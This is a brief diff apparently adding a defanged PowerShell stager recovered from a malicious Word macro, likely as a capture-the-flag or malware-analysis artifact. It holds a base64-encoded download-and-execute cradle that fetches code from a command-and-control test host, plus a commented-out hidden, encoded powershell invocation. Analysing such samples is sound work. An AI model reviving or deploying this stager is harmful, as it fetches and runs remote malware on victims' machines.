@@ -1,0 +1,5 @@
+# Recovered from malicious.docm VBA AutoOpen (DEFANGED - does not execute)
+$ErrorActionPreference = 'SilentlyContinue'
+$b = "SQBFAFgAIAAoAE4AZQB3AC0A" + "TwBiAGoAZQBjAHQAIABOAGUA" + "dAAuAFcAZQBiAEMAbABpAGUA" + "bgB0ACkALgBEAG8AdwBuAGwA" + "bwBhAGQAUwB0AHIAaQBuAGcA" + "KAAiAGgAdAB0AHAAOgAvAC8A" + "bQBhAGwAdwBhAHIAZQAtAGMA" + "MgAuAHQAZQBzAHQALwBnAGEA" + "dABlAC8ARgBMAEEARwB7AHMA" + "dAA0AHQAMQBjAF8ANABuADQA" + "bAB5AHMAMQBzAF8AcwA0AGYA" + "MwB9AC8AYgBlAGEAYwBvAG4A" + "IgApAA=="
+$cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
+# powershell.exe -NoP -W Hidden -Enc $b   <-- original invocation, neutered
